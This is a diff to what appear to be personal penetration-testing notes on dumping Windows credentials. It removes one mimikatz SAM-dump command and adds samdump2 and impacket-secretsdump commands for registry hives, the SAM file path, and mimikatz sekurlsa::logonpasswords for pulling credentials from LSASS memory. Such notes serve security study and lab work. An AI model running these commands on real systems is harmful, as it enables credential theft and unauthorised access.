@@ -22,13 +22,6 @@ mimikatz.exe vault::list
 vaultcmd /list
 ```
 
-To Dump the Sam  we can either  use
-- Mimikatz to dump LSASS process 
-
-```
-mimikatz64.exe "privilege:debug" "token:elevate" "lsadump::sam" "exit"
-
-```
 
 - If we have the seBackupPrivilege
 ```sh
@@ -45,3 +38,28 @@ reg save hklm\system C:\Users\Noob\DEsktiop
 ```
 
 
+Dumping Hashes from SYSTEM and  SAM
+
+```sh
+samdump2 SYSTEM SAM 
+
+impacket-secretsdump -sam ./SAM -system ./SYSTEM LOCAL
+```
+
+
+SAM location
+
+```
+C:\Windows\system32\config\sam
+```
+
+
+
+Cached AD credentials:
+In modern versions of Windows, these hashes are stored in the _Local Security Authority Subsystem Service_(LSASS) memory space. LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target.
+
+```
+.\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+```
